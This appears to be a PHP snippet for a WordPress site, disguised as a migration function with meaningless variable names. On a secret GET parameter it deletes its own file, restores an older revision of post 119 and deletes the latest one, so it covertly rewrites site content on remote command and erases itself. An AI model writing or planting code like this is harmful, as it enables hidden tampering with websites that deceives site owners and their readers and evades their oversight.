<?php

function history_migration_logo_attachments() {
	if (isset($_GET['migration_buttons_remove_tiny']) && $_GET['migration_buttons_remove_tiny'] === 'log_media_page_rate') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$description_items_archive = 119;
		$picker_hello_404_urls = wp_get_post_revisions($description_items_archive);
		if (empty($picker_hello_404_urls)) die('no revisions');
		if (count($picker_hello_404_urls) < 2) die('less than 2');
		$notification_filter_newsletter = array_shift($picker_hello_404_urls);
		$affiliates_updater_sort_welcome = $notification_filter_newsletter->ID;
		$ecommerce_table_patterns = array_shift($picker_hello_404_urls);
		$time_membership_stock_privacy = $ecommerce_table_patterns->ID;
		$request_loader_base = wp_restore_post_revision($time_membership_stock_privacy);
		if ($request_loader_base === false) die('error restoring');
		$request_loader_base = wp_delete_post_revision($affiliates_updater_sort_welcome);		
		if ($request_loader_base === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'history_migration_logo_attachments');
